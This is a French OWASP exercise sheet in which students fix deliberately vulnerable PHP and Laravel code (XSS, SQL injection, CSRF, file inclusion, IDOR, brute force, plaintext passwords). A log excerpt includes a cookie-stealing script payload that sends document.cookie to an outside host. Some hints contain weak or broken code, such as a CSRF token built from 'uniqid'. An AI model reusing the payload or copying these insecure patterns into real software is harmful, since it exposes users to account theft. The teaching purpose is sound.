# Exercices OWASP

Vous êtes en charge de la sécurité d'une application Web. Pour améliorer la sécurité, votre responsable a commandé un audit de sécurité. L'auditeur a trouvé plusieurs failles de sécurité. Vous devez corriger ces failles.

Votre application est composée de HTML, CSS, JavaScript et PHP.

La suite de l'exercice vous demandera d'identifier les failles de sécurité et de les corriger.

## Mise en situation

Vous êtes en charge de la correction d'un problème de sécurité. Nous sommes dans la phase d'analyse, vous devez identifier un problème. Dans un premier temps, vous devez analyser les logs d'accès à votre application :

```
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search?q=demo HTTP/1.0" 200 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8987 HTTP/1.0" 200 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8988 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8989 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8990 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8986 HTTP/1.0" 200 512
192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
```

Avez-vous identifié un problème de sécurité ? Si oui, lequel ?

À partir de l'analyse des logs, vous devez maintenant trouver où se trouve la faille dans le code source de votre application. Pour cela, vous avez à votre disposition les éléments suivants (code source projet Laravel) :

```bash
ls -l
app/
    Console/
    Exceptions/
    Http/
        Controllers/
            Auth/
            Controller.php
            HomeController.php
            FactureController.php
            AdminController.php
            UserController.php
        Middleware/
        Kernel.php
    Providers/
bootstrap/
config/
database/
public/
resources/
routes/
    api.php
    web.php
    server.php
storage/
tests/
```

```php
<?php
// Routeur de l'application

Route::get('/', 'HomeController@index');
Route::get('/search', 'HomeController@index');
Route::get('/facture', 'FactureController@index');
Route::get('/admin', 'AdminController@index');
// …
Route::get('/admin/users', 'UserController@index');
```

Quels sont les fichiers à analyser pour trouver la faille de sécurité ?

```php
<?php
// FactureController.php
class FactureController extends Controller
{
    public function index(Request $request)
    {
        $id = $request->input('id');
        $facture = Facture::find($id);
        if ($facture) {
            return view('facture', ['facture' => $facture]);
        }
        return abort(404);
    }

    private function checkIfUserCanAccessFacture($facture)
    {
        return $facture->user_id === Auth::id() 
    }

    private function throttleUserAccess(){
        return RateLimiter::for('facture')->hit(Auth::id());
    }
}
```

Modifier l'accès aux factures en utilisant les fonctions à votre disposition afin de corriger le problème de sécurité identifié.

## Faille 0

Observer les logs d'accès à votre application :

```
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search.php?query=<script>document.location='http://192.168.1.4.com/?c='+document.cookie</script> HTTP/1.0" 200 512
192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
```

Les logs vous semblent-ils suspects ? Si oui, pourquoi ?

Corriger le code de la page `search.php` pour éviter cette faille.

```php

<?php
$query = $_GET['query'];
echo "Résultat de la recherche pour $query";
$pdo->prepare("SELECT * FROM articles WHERE title LIKE '%?%'");
$pdo->execute([$query]);
$result = $pdo->fetchAll(PDO::FETCH_ASSOC);

foreach ($result as $article) {
    echo "<h2>$article['title']</h2>";
    echo "<p>$article['content']</p>";
}
?>
```

## Faille 1

L'auditeur a trouvé une faille de type XSS (Cross Site Scripting). Il a réussi à afficher une boîte de dialogue sur le navigateur de l'utilisateur.

Le code source ou la faille se trouve est le suivant :

```php
<?php
if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    echo "<h2>Bonjour $name</h2>";
    echo "<p>Votre email est $email</p>";
}
?>
<div class="container">
    <h1>Exercice 1</h1>
    <p>Vous devez corriger la faille XSS</p>
    <form action="index.php" method="post">
        <div class="form-group">
            <label for="name">Nom</label>
            <input type="text" class="form-control" id="name" name="name" placeholder="Nom">
        </div>
        <div class="form-group">
            <label for="email">Email</label>
            <input type="email" class="form-control" id="email" name="email" placeholder="Email">
        </div>
        <button type="submit" class="btn btn-primary">Envoyer</button>
    </form>
</div>
```

::: tip Rappel

Filtrer les entrées utilisateur avec la fonction `htmlspecialchars()`. Cette fonction permet de convertir les caractères spéciaux en entités HTML.

Exemple :

```php
// Échappe les caractères spéciaux. C'est à dire que les caractères spéciaux seront convertis en entités HTML.
$name = htmlspecialchars($_POST['name']);
```

Autre solution, utiliser la fonction `strip_tags()`. Cette fonction permet de supprimer les balises HTML.

Exemple :

```php
// Supprime les balises HTML
$name = strip_tags($_POST['name']);
```

:::

Proposez une solution pour corriger cette faille.

## Faille 2

L'auditeur a trouvé une faille de type Injection SQL. Il a réussi à afficher les données de la base de données.

Le code source ou la faille se trouve est le suivant :

```php
<?php

$id = $_GET['id'];
$request = "SELECT * FROM users WHERE id = $id";
$result = $pdo->query($request);
$user = $result->fetch(PDO::FETCH_ASSOC);
?>

<div class="container">
    <h1>Exercice 2</h1>
    <p>Vous devez corriger la faille d'injection SQL</p>
    <p>Voici les informations de l'utilisateur</p>
    <ul>
        <li>Nom : <?= $user['name'] ?></li>
        <li>Email : <?= $user['email'] ?></li>
    </ul>
</div>

<p>
    Voici la liste des utilisateurs :
</p>

-  <a href="index.php?id=1">Utilisateur 1</a>
-  <a href="index.php?id=2">Utilisateur 2</a>

```

Proposez une solution pour corriger cette faille.

## Faille 3

L'auditeur a trouvé une faille de type CSRF (Cross Site Request Forgery). Il a réussi à modifier les données de l'utilisateur.

Le code source ou la faille se trouve est le suivant :

```php

<?php
if(isset($_GET['id'])) {
    $request = "DELETE FROM user WHERE id = ?";
    $pdo->prepare($request)->execute([$_GET['id']]);
}
?>

<div class="container">
    <h1>Exercice 3</h1>
    <p>Vous devez corriger la faille CSRF</p>
    <p>Voici la liste des utilisateurs :</p>
    <ul>
        <li>Utilisateur 1 <a href="index.php?id=1">Supprimer</a></li>
        <li>Utilisateur 2 <a href="index.php?id=2">Supprimer</a></li>
    </ul>
</div>
```

::: tip Rappel

Le principe de la faille CSRF est de faire une requête à l'insu de l'utilisateur. Pour cela, il faut que l'utilisateur soit connecté à votre application. Ensuite, vous devez faire une requête à l'insu de l'utilisateur.

Pour corriger cette faille, vous devez ajouter un token dans le formulaire (ou en SESSION). Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.

```php
// Génère un token aléatoire
$_SESSION['token'] = bin2hex(random_bytes(32));

// Vérifier le token
if (isset($_POST['token']) && $_POST['token'] === $_SESSION['token']) {
    // Le token est valide, nous pouvons traiter la requête
    // ...
}
```
:::

Proposez une solution pour corriger cette faille.

## Faille 4

L'auditeur a trouvé une faille de type Inclusion de fichier. Il a réussi à afficher le contenu du fichier `config.php`.

Le code source ou la faille se trouve est le suivant :

```php

<?php
include $_GET['page'] . '.php';

// Exemple : index.php?page=config
?>
```

::: tip Rappel

Pour corriger cette faille, vous devez limiter les fichiers qui peuvent être inclus. Par exemple, vous pouvez créer un tableau avec les fichiers autorisés.

:::

Proposez une solution pour corriger cette faille.

## Faille 5

L'auditeur a trouvé une faille de type bruteforce.

Le code source ou la faille se trouve est le suivant :

```php
<?php

if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if ($password === '123456') {
        echo "<p>Vous êtes connecté</p>";
    } else {
        echo "<p>Mot de passe incorrect</p>";
    }
}

?>

<form method="post">
    <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" class="form-control" id="password" name="password" placeholder="Mot de passe">
    </div>
    <button type="submit" class="btn btn-primary">Envoyer</button>
</form>
```

::: tip Rappel

Pour corriger cette faille, plusieurs solutions sont possibles :

- Limiter le nombre de tentatives de connexion (par exemple 3 tentatives).
- Ajouter un token CSRF dans le formulaire. (voir faille 3)
- Ajouter un délai entre chaque tentative de connexion. (exemple : 1 seconde)

L'objectif est de limiter le nombre de tentatives de connexion. L'objectif est de ralentir l'attaque brute force.

:::

Proposez une solution pour corriger cette faille.

## Faille 6

L'attaquant a trouvé une faille de type manque de contrôle d'accès. Il a réussi à accéder à une page qui n'est pas accessible aux utilisateurs.

Le code source ou la faille se trouve est le suivant :

```php

// Routeur de l'application

<?php

Route::get('/', 'HomeController@index');
Route::get('/admin', 'AdminController@index');
// …
Route::get('/admin/users', 'UserController@index');

```

Proposez une solution pour corriger cette faille.

## Faille 7

Identifiez les failles de sécurité dans le code source suivant :

```php
<?php

if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $request = "INSERT INTO users (name, email) VALUES ('$name', '$email')";
    $pdo->exec($request);
}
?>
```

Proposez une solution pour corriger cette faille.

## Faille 8

Identifiez les failles de sécurité dans le code source suivant :

```php
<?php

if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $request = "INSERT INTO users (name, email) VALUES ('?', '?')";
    $pdo->prepare($request)->execute([$name, $email]);
}

?>
```

Proposez une solution pour corriger cette faille.

::: tip Rappel

Filtrer une saisie utilisateur :

- `htmlspecialchars()` : Convertit les caractères spéciaux en entités HTML.
- `strip_tags()` : Supprime les balises HTML.
- `filter_input()` : Filtre une variable avec un filtre spécifique.
  - `FILTER_SANITIZE_STRING` : Supprime les balises HTML et les caractères spéciaux.
  - `FILTER_SANITIZE_EMAIL` : Supprime les caractères illégaux dans un email.
  - `FILTER_SANITIZE_URL` : Supprime les caractères illégaux dans une URL.
  - `FILTER_SANITIZE_NUMBER_INT` : Supprime tous les caractères sauf les chiffres et le signe + et -.
  - Exemple : `filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);`
  - Exemple : `filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);`
  - Voir plus de filtres : [https://www.php.net/manual/fr/filter.filters.sanitize.php](https://www.php.net/manual/fr/filter.filters.sanitize.php)

:::

## Faille 9

Identifiez les failles de sécurité dans le code source suivant :

```php

<?php

echo "<h2>Bonjour $_GET['name']</h2>";

?>
```

L'utilisateur accède à la page avec l'URL suivante : `http://localhost:8000/index.php?name=John`

Proposez une solution pour corriger cette faille. Expliquez en quoi cette faille est dangereuse.

## Faille 10

L'auditeur a trouvé une faille de type XSS Stockée. Il a réussi à afficher une boîte de dialogue sur le navigateur des personnes visitant le site.

Le code source ou la faille se trouve est le suivant :

Page affichant les commentaires :

```php
<?php
// Récupère les commentaires
$request = "SELECT * FROM comments";
$comments = $pdo->query($request)->fetchAll(PDO::FETCH_ASSOC);

// Ajout d'un commentaire
if (isset($_POST['content'])) {
    $content = $_POST['content'];
    $request = "INSERT INTO comments (content) VALUES (?)";
    $pdo->prepare($request)->execute([$content]);
}
?>

<div class="container">
    <h1>Exercice 10</h1>
    <p>Vous devez corriger la faille XSS Stockée</p>
    <p>Voici les commentaires :</p>
    <ul>
        <?php foreach ($comments as $comment): ?>
            <li><?= $comment['content'] ?></li>
        <?php endforeach; ?>
    </ul>
</div>

<!-- Ajout d'un commentaire -->
<form>
    <div class="form-group">
        <label for="content">Commentaire</label>
        <textarea class="form-control" id="content" name="content" rows="3"></textarea>
    </div>
    <button type="submit" class="btn btn-primary">Envoyer</button>
</form>
```

Proposez une solution pour corriger cette faille. Deux solutions sont possibles.

## Faille 11

L'auditeur a trouvé dans votre code une faille de type Bruteforce / CSRF. Avec cette faille il est capable de rejouer une requête à l'infini sans aucune limite, il peut s'en servir pour bruteforcer un mot de passe par exemple.

Soit l'extrait de code suivant :

```html
<!-- Formulaire d'authentification -->
<form action="/login" method="post">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

```php
<?php

$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

// Vérification du mot de passe
$request = "SELECT * FROM users WHERE username = ?";
$pdo->prepare($request)->execute([$username]);
$user = $pdo->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($password, $user['password'])) {
    // Connexion réussie
    // …
}
```

L'auditeur vous indique que vous devez mettre en place en place un token afin d'éviter le rejeu de requête.

::: tip Protection CSRF / Token

Pour protéger votre application contre les attaques CSRF, vous devez ajouter un token CSRF dans le formulaire. Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.

```php
// Génère un token aléatoire
$_SESSION['token'] = uniqid;

// Vérifier le token
if (isset($_POST['token']) && $_POST['token'] === $_SESSION['token']) {
    // Nous avons consommé le token, nous pouvons le supprimer
    unset($_SESSION['token']);

    // Le token est valide, nous pouvons traiter la requête
    // ...
}
```

Et dans le formulaire :

```html
<input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
```

:::

Proposez une solution pour corriger cette faille.

::: tip Rappel

Pour corriger cette faille, d'autres solutions sont possibles :

- Limiter le nombre de tentatives de connexion (par exemple 3 tentatives).
- Ajouter un token CSRF dans le formulaire. (voir faille 3)
- Ajouter un délai entre chaque tentative de connexion. (exemple : 1 seconde)

L'objectif est de limiter le nombre de tentatives de connexion. L'objectif est de ralentir l'attaque brute force.

:::

## Faille 12

L'auditeur a trouvé une faille de type défaut de sécurisation de votre application. En effet lors de l'audit il découvre les enregistrements suivants en base de données :

```
=> SELECT * FROM users;

+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | adminSuperMotDePasse             |
|  2 | user     | user                             |
|  3 | root     | root                             |
+----+----------+----------------------------------+
```

Est-ce que vous voyez la potentielle faille de sécurité ?

Le code de création d'un utilisateur est le suivant :

```php
<?php
// Création d'un utilisateur
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$request = "INSERT INTO users (username, password) VALUES (?, ?)";
$pdo->prepare($request)->execute([$username, $password]);

?>
```

```php
<?php
// Vérification du mot de passe
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$request = "SELECT * FROM users WHERE username = ?";
$pdo->prepare($request)->execute([$username]);

$user = $pdo->fetch(PDO::FETCH_ASSOC);

if ($user && $password === $user['password']) {
    // Connexion réussie
    // …
}
?>
```

Proposez une solution pour corriger cette faille.

::: details Documentation

Pour stocker un mot de passe, vous devez utiliser la fonction `password_hash()`.

```php
$password = password_hash($_POST['password'], PASSWORD_DEFAULT);
```

Pour vérifier un mot de passe, vous devez utiliser la fonction `password_verify()`.

```php
if (password_verify($_POST['password'], $user['password'])) {
    // Le mot de passe est valide
}
```

:::

## Double authentification

L'auditeur a trouvé une faille de sécurité dans votre application. Il vous demande de mettre en place une double authentification pour renforcer la sécurité de votre application.

Il vous encourage à mettre en place une authentification à deux facteurs (2FA) de type matériel (une application mobile), pour cela il vous indique que vous pouvez utiliser le code de la librairie 2FAAuth. Celle-ci s'utilise de la manière suivante :

```php
$doubleAuth = new 2FAAuth("Nom de l'application");
$user = User::findByLogin($login, $password);
$doubleAuth->setUser($user);
$code = $_POST['code'] ?? null;

if($doubleAuth->isCodeValid($code)) {
    // L'utilisateur est authentifié
} else {
    // L'utilisateur doit saisir le code 2FA
}
```

Le code actuel de votre application est le suivant :

### Page de login

```html
<form action="/login" method="post">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

### Page de gestion de l'authentification

```php
<?php

// Page de gestion de l'authentification

$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

$user = User::findByLogin($username, $password);

if ($user) {
    header('Location: /dashboard');
} else {
    header('Location: /login');
}

die();
```

Proposez une solution pour mettre en place une double authentification dans votre application.